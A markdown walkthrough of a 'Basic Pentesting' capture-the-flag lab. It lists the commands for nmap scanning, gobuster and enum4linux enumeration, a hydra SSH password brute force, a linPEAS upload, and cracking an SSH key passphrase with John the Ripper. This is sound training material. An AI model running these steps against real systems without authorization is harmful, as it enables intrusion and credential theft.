 # Basic Pentesting challenge walkthrough 
 
![](https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/images/peass.png)


Tools used for the challenge : 
- nmap
- gobuster 
- enum4linux 
- hydra
- JohnTheRipper

## Port scanning 

```
nmap -sC -sV -oN output.txt  IP` 
```
`-sC` is used to scan scripts of type “safe” and “intrusive” by default. 
`-sV` tests the opened ports to determine the services et their version. 
`-oN` will create a file with the command ouput. 

> Result will show some opened ports :
22 (ssh), 80 (http), 139, 445   

## Enumeration 
### 1. Gobuster

Gobuster is used for the hidden directories search. It works with wordlist composed of widely used terms to describe paths.

```
gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://IP
```
> Exposes directory discovered where some paths are accessibles :
_ /development

### 2. enum4linux

enum4linux is used to list different users available.

```
enum4linux -a IP
```

> Returns :
usernames ( $USER ) 

## Password Discovery

hydra is an kali integrated tool for bruteforce.

```
hydra -l $USER -P /usr/share/wordlists/rockyou.txt.gz ssh://IP
```

> Returns : 
password in plain text

## Privileges Escalation

Since `/etc/shadow` gives us a **permission denied** message, we have to find sudo user password.

Let's try to find some interesting stuff with `PEASS - Privilege Escalation Awesome Scripts SUITE` [github link](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)

Once it's downloaded, let's upload this by `ssh` with `scp` :

```
scp /path/to/linpeas.sh $USER@IP:/dev/shm
```
`/dev/shm`: temporary directory writable and readable from a guest session

> Discovery : 
Path to ssh key

We can use it to access sudo user session **BUT** we are in front of a passphrase needed. 

### 1. Passphrase cracking

We'll use JohnTheRipper package.

Usage : 
```
> python3 ssh2john rsa_public_key > res.txt
> ./john res.txt --wordlist=/usr/share/wordlists/rockyou.txt.gz
```

## Final Flag 

After logging on the sudo user with the ssh key + the passphrase we can discover his password with : 
```
cat $HOME/pass.bak 
```

**Done!**













